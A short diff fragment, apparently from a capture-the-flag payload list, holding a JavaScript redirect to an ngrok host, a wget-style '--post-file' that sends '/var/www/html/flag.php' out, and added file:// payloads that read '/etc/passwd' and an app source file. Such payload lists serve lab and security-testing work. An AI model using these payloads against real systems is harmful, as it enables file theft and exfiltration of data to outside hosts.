@@ -33,3 +33,6 @@ window.location.href = "https://361c4f4977c5.ngrok.io/yaku";
 
 
 / --post-file '/var/www/html/flag.php'
+
+file:///etc/passwd
+file:///home/ctf/app.py
